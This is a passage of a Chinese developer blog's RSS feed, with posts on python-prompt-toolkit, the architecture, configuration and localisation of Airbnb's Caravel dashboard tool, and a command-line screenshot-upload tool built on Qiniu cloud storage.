        &lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/6.png?raw=true" /&gt;&lt;/p&gt;
&lt;p&gt;希望这篇文章能给你一些启发去构建命令行工具&lt;/p&gt;
&lt;p&gt;以上&lt;/p&gt;
&lt;h1&gt;附录&lt;/h1&gt;
&lt;h3&gt;unicode&lt;/h3&gt;
&lt;p&gt;在python2中使用&lt;code&gt;from __future__ import unicode_literals&lt;/code&gt;，这样一来所有字符串将被解释为unicode,无论是否有&lt;code&gt;u''&lt;/code&gt;,这样一来和python3保持了一致&lt;/p&gt;
&lt;h3&gt;example&lt;/h3&gt;
&lt;p&gt;python-prompt-toolkit的教程写得极好，通过&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit/tree/master/examples"&gt;examples&lt;/a&gt;，花很短的时间，我们就能学会如何使用python-prompt-toolkit的丰富特性&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 31 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-31:python-prompt-toolkit.html</guid><category>tools</category></item><item><title>caravel系列之架构与源码浅析</title><link>/caravel-code.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_Architecture4aacdce6.png" /&gt;&lt;/p&gt;
&lt;p&gt;如果你打算改造和定制caravel，这篇文章可能对你有帮助&lt;/p&gt;
&lt;h1&gt;外围观察&lt;/h1&gt;
&lt;p&gt;上边的这张图列出了caravel用到的部分技术（由Wappalyzer分析得出）&lt;/p&gt;
&lt;p&gt;包括：&lt;/p&gt;
&lt;h3&gt;后端&lt;/h3&gt;
&lt;p&gt;采用python的Flask框架（当前版本是Flask 0.11.10，caravel版本是0.10.0)&lt;/p&gt;
&lt;h3&gt;前端&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;React&lt;/li&gt;
&lt;li&gt;Bootstrap&lt;/li&gt;
&lt;li&gt;D3&lt;/li&gt;
&lt;li&gt;NVD3&lt;/li&gt;
&lt;li&gt;jQuery&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;技术栈的细节可以通过翻阅&lt;a href="https://github.com/airbnb/caravel"&gt;源码库&lt;/a&gt;得到&lt;/p&gt;
&lt;h1&gt;走近源码库&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_github6c3f2fb2.png" /&gt;&lt;/p&gt;
&lt;p&gt;查阅caravel的项目页我们可以知道其技术栈构成，python和javascript分别支撑前后端,python占据大半代码量&lt;/p&gt;
&lt;h3&gt;后端依赖&lt;/h3&gt;
&lt;p&gt;查阅源码库中的&lt;a href="https://github.com/airbnb/caravel/blob/0.10.0/setup.py"&gt;setup.py&lt;/a&gt;，我们可以知道项目依赖&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;'cryptography==1.4',&lt;/li&gt;
&lt;li&gt;'flask-appbuilder==1.8.1',&lt;/li&gt;
&lt;li&gt;'flask-cache==0.13.1',&lt;/li&gt;
&lt;li&gt;'flask-migrate==1.5.1',&lt;/li&gt;
&lt;li&gt;'flask-script==2.0.5',&lt;/li&gt;
&lt;li&gt;'flask-testing==0.5.0',&lt;/li&gt;
&lt;li&gt;'flask-sqlalchemy==2.0',&lt;/li&gt;
&lt;li&gt;'humanize==0.5.1',&lt;/li&gt;
&lt;li&gt;'gunicorn==19.6.0',&lt;/li&gt;
&lt;li&gt;'markdown==2.6.6',&lt;/li&gt;
&lt;li&gt;'pandas==0.18.1',&lt;/li&gt;
&lt;li&gt;'parsedatetime==2.0.0',&lt;/li&gt;
&lt;li&gt;'pydruid==0.3.0',&lt;/li&gt;
&lt;li&gt;'python-dateutil==2.5.3',&lt;/li&gt;
&lt;li&gt;'requests==2.10.0',&lt;/li&gt;
&lt;li&gt;'simplejson==3.8.2',&lt;/li&gt;
&lt;li&gt;'six==1.10.0',&lt;/li&gt;
&lt;li&gt;'sqlalchemy==1.0.13',&lt;/li&gt;
&lt;li&gt;'sqlalchemy-utils==0.32.7',&lt;/li&gt;
&lt;li&gt;'sqlparse==0.1.19',&lt;/li&gt;
&lt;li&gt;'werkzeug==0.11.10',&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们忽视工具型的库，对核心库做个简要介绍&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/dpgaspar/Flask-AppBuilder"&gt;flask-appbuilder&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Simple and rapid application development framework, built on top of Flask. Includes detailed security, auto CRUD generation for your models, google charts and much more.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flask-appbuilder是caravel的项目骨架，如果想定制深度caravel，建议认真读完flask-appbuilder的&lt;a href="http://flask-appbuilder.readthedocs.io/"&gt;文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;更多介绍可以参考&lt;a href="http://flaskappbuilder.pythonanywhere.com/"&gt;flaskappbuilder.pythonanywhere.com/&lt;/a&gt;或者&lt;a href="http://flask-appbuilder.readthedocs.io/en/latest/intro.html"&gt;Introduction&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一些简单的案例可以参考这里&lt;a href="https://github.com/dpgaspar/Flask-AppBuilder/tree/master/examples"&gt;examples&lt;/a&gt;和&lt;a href="https://github.com/dpgaspar/Flask-AppBuilder-Skeleton"&gt;Flask-AppBuilder-Skeleton&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;flask-appbuilder给我感觉像是把flask的工具链做了整合，使其功能全面（通往django之路？）&lt;/p&gt;
&lt;!--
专门写一篇文章介绍flask-appbuilder
所有指令：http://flask-appbuilder.readthedocs.io/en/latest/fabmanager.html
fabmanager list-users --app caravel
babel-compile   翻译
http://flask-appbuilder.readthedocs.io/en/latest/quickhowto.html 和django admin很像！ 由此可知每个仅仅是数据表，可以被复制重用！！
--&gt;

&lt;h3&gt;&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;关于pandas的介绍我们引&lt;a href="http://cloga.info/python/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6/2013/09/17/pandas_intro/"&gt;这篇文章&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Pandas是python的一个数据分析包，最初由AQR Capital Management于2008年4月开发，并于2009年底开源出来，目前由专注于Python数据包开发的PyData开发team继续开发和维护，属于PyData项目的一部分。Pandas最初被作为金融数据分析工具而开发出来，因此，pandas为时间序列分析提供了很好的支持。 Pandas的名称来自于面板数据（panel data）和python数据分析（data analysis）。panel data是经济学中关于多维数据集的一个术语，在Pandas中也提供了panel的数据类型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a href="https://github.com/zzzeek/sqlalchemy"&gt;sqlalchemy&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;SQLAlchemy是Python社区中最广泛使用的ORM工具，底层而强大&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SQLAlchemy的理念是，SQL数据库的量级和性能重要于对象集合；而对象集合的抽象又重要于表和行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于sqlalchemy的更多细节，可以参考我的&lt;a href="http://blog.just4fun.site/relational-database-summary.html"&gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;前端依赖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"autobind-decorator": "^1.3.3",&lt;/li&gt;
&lt;li&gt;"babel-loader": "^6.2.1",&lt;/li&gt;
&lt;li&gt;"babel-polyfill": "^6.3.14",&lt;/li&gt;
&lt;li&gt;"babel-preset-es2015": "^6.3.13",&lt;/li&gt;
&lt;li&gt;"babel-preset-react": "^6.3.13",&lt;/li&gt;
&lt;li&gt;"bootstrap": "^3.3.6",&lt;/li&gt;
&lt;li&gt;"bootstrap-datepicker": "^1.6.0",&lt;/li&gt;
&lt;li&gt;"bootstrap-toggle": "^2.2.1",&lt;/li&gt;
&lt;li&gt;"brace": "^0.7.0",&lt;/li&gt;
&lt;li&gt;"brfs": "^1.4.3",&lt;/li&gt;
&lt;li&gt;"cal-heatmap": "3.5.4",&lt;/li&gt;
&lt;li&gt;"css-loader": "^0.23.1",&lt;/li&gt;
&lt;li&gt;"d3": "^3.5.14",&lt;/li&gt;
&lt;li&gt;"d3-cloud": "^1.2.1",&lt;/li&gt;
&lt;li&gt;"d3-sankey": "^0.2.1",&lt;/li&gt;
&lt;li&gt;"d3-tip": "^0.6.7",&lt;/li&gt;
&lt;li&gt;"datamaps": "^0.4.4",&lt;/li&gt;
&lt;li&gt;"datatables-bootstrap3-plugin": "^0.4.0",&lt;/li&gt;
&lt;li&gt;"datatables.net-bs": "^1.10.11",&lt;/li&gt;
&lt;li&gt;"exports-loader": "^0.6.3",&lt;/li&gt;
&lt;li&gt;"font-awesome": "^4.5.0",&lt;/li&gt;
&lt;li&gt;"gridster": "^0.5.6",&lt;/li&gt;
&lt;li&gt;"imports-loader": "^0.6.5",&lt;/li&gt;
&lt;li&gt;"jquery": "^2.2.1",&lt;/li&gt;
&lt;li&gt;"jquery-ui": "^1.10.5",&lt;/li&gt;
&lt;li&gt;"json-loader": "^0.5.4",&lt;/li&gt;
&lt;li&gt;"less": "^2.6.1",&lt;/li&gt;
&lt;li&gt;"less-loader": "^2.2.2",&lt;/li&gt;
&lt;li&gt;"mapbox-gl": "^0.20.0",&lt;/li&gt;
&lt;li&gt;"mustache": "^2.2.1",&lt;/li&gt;
&lt;li&gt;"nvd3": "1.8.3",&lt;/li&gt;
&lt;li&gt;"react": "^0.14.7",&lt;/li&gt;
&lt;li&gt;"react-bootstrap": "^0.28.3",&lt;/li&gt;
&lt;li&gt;"react-dom": "^0.14.7",&lt;/li&gt;
&lt;li&gt;"react-grid-layout": "^0.12.3",&lt;/li&gt;
&lt;li&gt;"react-map-gl": "^1.0.0-beta-10",&lt;/li&gt;
&lt;li&gt;"react-resizable": "^1.3.3",&lt;/li&gt;
&lt;li&gt;"select2": "3.5",&lt;/li&gt;
&lt;li&gt;"select2-bootstrap-css": "^1.4.6",&lt;/li&gt;
&lt;li&gt;"style-loader": "^0.13.0",&lt;/li&gt;
&lt;li&gt;"supercluster": "Pending PR at https://github.com/mapbox/supercluster/pull/12",&lt;/li&gt;
&lt;li&gt;"supercluster": "https://github.com/georgeke/supercluster/tarball/ac3492737e7ce98e07af679623aad452373bbc40",&lt;/li&gt;
&lt;li&gt;"topojson": "^1.6.22",&lt;/li&gt;
&lt;li&gt;"transform-loader": "^0.2.3",&lt;/li&gt;
&lt;li&gt;"viewport-mercator-project": "^2.1.0",&lt;/li&gt;
&lt;li&gt;"webpack": "^1.12.12",&lt;/li&gt;
&lt;li&gt;"webworkify-webpack": "1.0.6"&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;源码分析（后端）&lt;/h1&gt;
&lt;p&gt;caravel提供命令行工具&lt;code&gt;caravel&lt;/code&gt;,项目的创建，demo的加载都由改指令负责，例如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Create default roles and permissions
caravel init

# Load some data to play with
caravel load_examples

# Start the web server on port 8088
caravel runserver -p 8088
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们知道&lt;a href="https://github.com/airbnb/caravel/blob/master/setup.py"&gt;setup.py&lt;/a&gt;里的scripts将被注册为命令行工具（参考&lt;a href="https://docs.python.org/2.7/distutils/setupscript.html#installing-scripts"&gt; Installing Scripts&lt;/a&gt;），&lt;code&gt;caravel&lt;/code&gt;便是注册自这里&lt;/p&gt;
&lt;p&gt;从源码中我们看到&lt;code&gt;scripts=['caravel/bin/caravel']&lt;/code&gt;,按图索骥找到入口：&lt;a href="https://github.com/airbnb/caravel/blob/0.10.0/caravel/bin/caravel"&gt;caravel&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;启动参数&lt;/h3&gt;
&lt;p&gt;从中我们连接到caravel（caravel runserver）服务跑起来时各个参数的意义&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-d : 以debug模式启动 //官方教程里启动caravel服务的指令为 caravel runserver -d ，即默认为调试模式,&lt;/li&gt;
&lt;li&gt;-p : 指定端口&lt;/li&gt;
&lt;li&gt;-w : 指定gunicorn的worker数量 // gunicorn是一个Python WSGI UNIX的HTTP服务器&lt;/li&gt;
&lt;li&gt;-t : 指定gunicorn服务过期时间&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当我们用-d参数运行caravel runserver时，我们并未将wsgi app跑在gunicorn，如果是生产使用，应该去掉-d&lt;/p&gt;
&lt;p&gt;如果我们有兴趣跟踪或定制caravel init(创建默认角色和权限)和caravel load_example的执行流程，跟踪相应函数即可&lt;/p&gt;
&lt;h3&gt;web服务&lt;/h3&gt;
&lt;p&gt;由&lt;code&gt;caravel runserver&lt;/code&gt;跑起来的web服务的相关信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由gunicorn运行wsgi application&lt;/li&gt;
&lt;li&gt;wsgi application为caravel:app&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来我们开始分析&lt;code&gt;caravel:app&lt;/code&gt;，这是整个项目的核心所在&lt;/p&gt;
&lt;h3&gt;caravel:app&lt;/h3&gt;
&lt;p&gt;由python模块相关的知识（建议参考《learning python》），我们知道&lt;code&gt;from caravel import app&lt;/code&gt;中，当caravel是目录是，app来自&lt;a href="https://github.com/airbnb/caravel/blob/0.10.0/caravel/__init__.py"&gt;caravel/&lt;strong&gt;init&lt;/strong&gt;.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这实际上是Flask-AppBuilder常见的项目组织形式 ，可以参考这个简要的&lt;a href="https://github.com/dpgaspar/Flask-AppBuilder/tree/master/examples/quickhowto"&gt;例子&lt;/a&gt;,相关解释看&lt;a href="http://flask-appbuilder.readthedocs.io/en/latest/quickminimal.html"&gt;这篇文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;要想了解caravel的项目骨架，必须通读一遍&lt;a href="http://flask-appbuilder.readthedocs.io/en/latest/index.html"&gt;flask-appbuilder的文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过阅读flask-appbuilder的文档，我们了解到caravel实际是Flask-AppBuilder的一个具体应用（app），所以我们可以用fabmanager来控制caravel，诸如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Create an admin user&lt;/span&gt;
fabmanager create-admin --app caravel

fabmanager list-users --app caravel

fabmanager list-views --app caravel
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;caravel api&lt;/h3&gt;
&lt;p&gt;通过阅读&lt;a href="http://flask-appbuilder.readthedocs.io/en/latest/quickhowto.html"&gt;Model Views (Quick How to)&lt;/a&gt;,我们了解了caravel的项目骨架和model相关的知识，和django十分相似，包括管理CURD机制也和django admin极其相似，django admin的确是个耀眼的设计，被借鉴倒是不奇怪。&lt;/p&gt;
&lt;p&gt;这篇文章还提到ModelView最终会暴露出 REST API，而且带有权限验证，方面你做各种粒度的控制 ！ 这个设计比django admin还漂亮，惊为天人&lt;/p&gt;
&lt;p&gt;相关细节参考&lt;a href="http://flask-appbuilder.readthedocs.io/en/latest/quickhowto.html#exposed-methods"&gt;Exposed methods&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们到caravel中一试，完全可用:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_api7b396d27.png" /&gt;&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;目前这个分析更侧重项目结构的源码分析，还不涉及数据分析部分的分析，限于时间有限，数据部分，下回分解&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-27:caravel-code.html</guid><category>data</category></item><item><title>用python写一个命令行下的图床(更爽地用markdown写作)</title><link>/blog-and-fig-bed.html</link><description>&lt;h1&gt;一图胜千言&lt;/h1&gt;
&lt;p&gt;&lt;img alt="figbed" src="http://oav6fgfj1.bkt.clouddn.com/figbed.gif" /&gt;&lt;/p&gt;
&lt;h1&gt;安装与使用&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：目前只支持mac系统&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;brew install pngpaste&lt;/li&gt;
&lt;li&gt;pip install figbed&lt;/li&gt;
&lt;li&gt;注册七牛账号，获得配置参数，更多细节参考&lt;a href="https://github.com/wwj718/figbed"&gt;wwj718/figbedi&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;在账号设置页面，找到密钥标签，获取到AK和SK&lt;/li&gt;
&lt;li&gt;新建一个空间，在空间设置页面，获取到您的域名,和空间对于的域名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/figbed_md1.png" /&gt;，上边这张截图就是采用figbed处理的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建配置文件&lt;code&gt;~/.qiniu.yml&lt;/code&gt;，形如&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;AK&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;xxx&lt;/span&gt;
&lt;span class="n"&gt;SK&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;xxx&lt;/span&gt;
&lt;span class="n"&gt;YOUR_DOAMIN&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="n"&gt;xxx&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;bkt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;clouddn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;com&lt;/span&gt;
&lt;span class="n"&gt;YOUR_BUCKET&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;fig&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bed&lt;/span&gt;
&lt;span class="n"&gt;PATH_SAVEAS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="sr"&gt;/BLOG/&lt;/span&gt;&lt;span class="n"&gt;IMAGE&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中AK,SK,YOUR_DOAMIN,YOUR_BUCKET已在上边介绍过了，PATH_SAVEAS是图片将要保存的本地路径（默认为/tmp），建议保存到文章同属的git库里，做个备份&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;启动图床服务：figbed&lt;/li&gt;
&lt;li&gt;截图完成后，使用command+v即可以获取到url&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;开发动机&lt;/h1&gt;
&lt;p&gt;我的博客采用pelican构建，托管在github上。&lt;/p&gt;
&lt;p&gt;采用markdown写作，博客托管在github上，可能已是技术圈的主流做法了。一般而言，图片可以一并存放在github中，静态博客生成器会有一套路径规则，把图片放到相应目录，之后在markdown里引用就行&lt;/p&gt;
&lt;h3&gt;我的写作场景&lt;/h3&gt;
&lt;p&gt;大多时候，我喜欢一边写作，一边准备图片，时常是顺手截图（使用QQ截图，近期换成&lt;code&gt;jietu&lt;/code&gt;）。截下的图片，保留在剪切板里，之后粘贴到印象笔记里，然后右键保存图片到对于目录里，这样就可以在文章里引用了&lt;/p&gt;
&lt;h3&gt;不爽的地方&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;过程冗长，印象笔记在此只是中转站的作用&lt;/li&gt;
&lt;li&gt;图片是相对路径，不是url，所以无法即时在预览里呈现&lt;/li&gt;
&lt;li&gt;图片的尺寸需要调整（我一般使用美图秀秀在线版）&lt;/li&gt;
&lt;li&gt;github网速慢，图片加载很卡&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;改进过程&lt;/h3&gt;
&lt;p&gt;我试图去优化这个过程，从截图到获得url。我期待的流程是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;截图&lt;/li&gt;
&lt;li&gt;保存到七牛云（良心推荐），生产url&lt;/li&gt;
&lt;li&gt;图片同时保存到本地指定目录，同文章原文（content）一样被git管理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在改进过程中，找到过一些工具，但都不理想，于是到github搜寻一番，找到xiaochao同学的&lt;a href="https://github.com/xiaochao/cut"&gt;cut&lt;/a&gt;, readme里提到&lt;code&gt;pngpaste&lt;/code&gt;，醍醐灌顶，我需要的正是这个东西，能在命令行将剪切板的图片保存到本地&lt;/p&gt;
&lt;h1&gt;注意&lt;/h1&gt;
&lt;p&gt;目前只支持mac，使用七牛云，其他平台可以参考&lt;a href="https://github.com/wwj718/figbed"&gt;figbed&lt;/a&gt;文末&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 26 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-26:blog-and-fig-bed.html</guid><category>tools</category></item><item><title>caravel系列之简易配置/定制</title><link>/caravel-config.html</link><description>&lt;p&gt;&lt;img alt="caravel" src="http://oav6fgfj1.bkt.clouddn.com/caravel_configdea10468.png" /&gt;&lt;/p&gt;
&lt;p&gt;在上一篇文章里，我们简单介绍了caracel和它的安装方式，这篇文章主要介绍如何简单配置/定制caravel&lt;/p&gt;
&lt;h1&gt;默认配置&lt;/h1&gt;
&lt;p&gt;caravel的默认配置为&lt;a href="https://github.com/airbnb/caravel/blob/master/caravel/config.py"&gt;config&lt;/a&gt;，我们可能对其中的一些配置项感兴趣&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CARAVEL_WORKERS&lt;/li&gt;
&lt;li&gt;CARAVEL_WEBSERVER_PORT&lt;/li&gt;
&lt;li&gt;APP_NAME&lt;/li&gt;
&lt;li&gt;APP_ICON&lt;/li&gt;
&lt;li&gt;BABEL_DEFAULT_LOCALE&lt;/li&gt;
&lt;li&gt;LANGUAGES&lt;/li&gt;
&lt;li&gt;CACHE_CONFIG&lt;/li&gt;
&lt;li&gt;ENABLE_CORS&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些变量的自说明性很好，就不解释了&lt;/p&gt;
&lt;h3&gt;修改默认配置&lt;/h3&gt;
&lt;p&gt;创建caravel_config.py，通过在PYTHONPATH里添加caravel_config.py所在目录的路径&lt;/p&gt;
&lt;p&gt;至于如何修改PYTHONPATH，我的做法是修改&lt;code&gt;~/.bash_profile&lt;/code&gt;，添加&lt;/p&gt;
&lt;p&gt;&lt;code&gt;export PYTHONPATH=/home/wwj/caravel_dev&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后需要退出shell，再进入才生效&lt;/p&gt;
&lt;p&gt;我的caravel_config.py在/home/wwj/caravel_dev目录下&lt;/p&gt;
&lt;p&gt;启动caravel runserver -d,即可看到定制化的caravel&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_configccd15ac6.png" /&gt;&lt;/p&gt;
&lt;h3&gt;界面定制&lt;/h3&gt;
&lt;p&gt;点击dashboard里&lt;code&gt;Edit the dashboard'css&lt;/code&gt;按钮，之后你可以选择不同的主题，方然也可以添加你自己css样式&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/caravel_css2304d63d.png" /&gt;&lt;/p&gt;
&lt;p&gt;caravel使用flask-appbuilder构建项目骨架,flask-appbuilder采用了&lt;a href="https://github.com/thomaspark/bootswatch"&gt;bootswatch&lt;/a&gt;来定制主题样式，可以通过APP_THEME变量来改变主题,可选主题参考&lt;a href="http://bootswatch.com/"&gt;bootswatch.com&lt;/a&gt;,我偏好slate主题，slate对应的配置为&lt;code&gt;APP_THEME = "slate.css"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;具体的配置选项参考:&lt;a href="https://github.com/dpgaspar/Flask-AppBuilder/blob/master/examples/oauth/config.py"&gt;examples/oauth/config.py&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;更多定制&lt;/h3&gt;
&lt;p&gt;前头说到caravel使用flask-appbuilder来构建项目骨架，所以flask-appbuilder的配置参数，对caravel有效，具体配置参考：&lt;a href="http://flask-appbuilder.readthedocs.io/en/latest/config.html"&gt;flask-appbuilder config&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;汉化&lt;/h3&gt;
&lt;p&gt;首先你需要修改LANGUAGES变量的默认值，默认不包含汉语，当前（2016-07-26）默认安装的caravel版本为caravel-0.10.0,这个版本的源码不带有翻译包（translations）, 如果你期望做汉化的话，需要手动将&lt;code&gt;translations/zh/LC_MESSAGES&lt;/code&gt;目录放到package安装路径下&lt;/p&gt;
&lt;p&gt;以下是我的汉化文件，在目录下执行以下代码即可&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://raw.githubusercontent.com/wwj718/caravel/master/caravel/translations/zh/LC_MESSAGES/messages.po
wget https://raw.githubusercontent.com/wwj718/caravel/master/caravel/translations/zh/LC_MESSAGES/messages.mo
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;目前汉化包还不完备，之后有时间，我想维护一个&lt;code&gt;caravel_cn&lt;/code&gt;的项目，做些本地化的工作,包括常用前端库的国内cdn和google字体之类的本地化，有兴趣的小伙伴可以一起&lt;/p&gt;
&lt;h3&gt;认证系统&lt;/h3&gt;
&lt;p&gt;默认的认证系统为&lt;code&gt;AUTH_TYPE = AUTH_DB&lt;/code&gt;,我们可以将其配置为其他选项，诸如：AUTH_REMOTE_USER,AUTH_OID,AUTH_LDAP以及AUTH_OAUTH,配置为OAuth时,需要安装&lt;code&gt;Flask-OAuthlib&lt;/code&gt;,之后flask-appbuilder和Flask-OAuthlib有一个整合，如果你需要使用自己的oauth provider，可能需要处理下这部分&lt;/p&gt;
&lt;p&gt;另,把用户设置为public，会导致无法登陆(错误信息为：Access is Denied for: can_welcome)。建议给新用户alpha权限，这样一来不具有管理权限,又可以正常浏览&lt;/p&gt;
&lt;!--
使用cas：https://github.com/cameronbwhite/Flask-CAS
可能需要修改flask-appbuilderd额用户机制
添加AUTH_TYPE类型
可以试着跟踪一个实现
userdbmodelview
以及：MyUserDBView

拿个flask-appbuilderd来测试吧

http://flask-appbuilder.readthedocs.io/en/latest/security.html  拓展用户
https://github.com/chuanqitan/union-SSO
改造oauth2是可能的
oauth2手写，需要新建

    def oauth_providers(self):
        return self.appbuilder.get_app.config['OAUTH_PROVIDERS']

https://github.com/dpgaspar/Flask-AppBuilder/blob/master/flask_appbuilder/security/manager.py#L359 github 跟踪

https://github.com/lepture/flask-oauthlib/blob/master/flask_oauthlib/contrib/apps.py#L37  这就是关键字所在
--&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 26 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-26:caravel-config.html</guid><category>data</category></item><item><title>caravel系列之案例讲解与分析</title><link>/caravel-demo-analysis.html</link><description>&lt;p&gt;&lt;img alt="" src="http://airbnb.io/caravel/_static/img/dash.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们以官方的示例数据为例(sqlite数据库中的birch_names数据表)&lt;/p&gt;
&lt;p&gt;想体验真实数据的小伙伴可以登录我的demo中一看究竟&lt;a href="http://caravel.just4fun.site/caravel/dashboard/births/"&gt;demo births&lt;/a&gt;,用户名和密码都是test&lt;/p&gt;
&lt;h1&gt;birch_names&lt;/h1&gt;
&lt;p&gt;birch_names是一张数据表（table），来自于数据库：&lt;code&gt;sqlite:////tmp/caravel.db&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="表结构" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_mainac79ec66.png" /&gt;&lt;/p&gt;
&lt;p&gt;数据一览
&lt;img alt="表内容" src="http://oav6fgfj1.bkt.clouddn.com/caravel_demo_main84bfa3fb.png" /&gt;&lt;/p&gt;
&lt;p&gt;以上便是我们的原始数据，那么原始数据是如何一步步变为开篇那幅图表的呢，下边为你揭晓&lt;/p&gt;
&lt;h1&gt;workflow&lt;/h1&gt;
&lt;h3&gt;添加数据源&lt;/h3&gt;
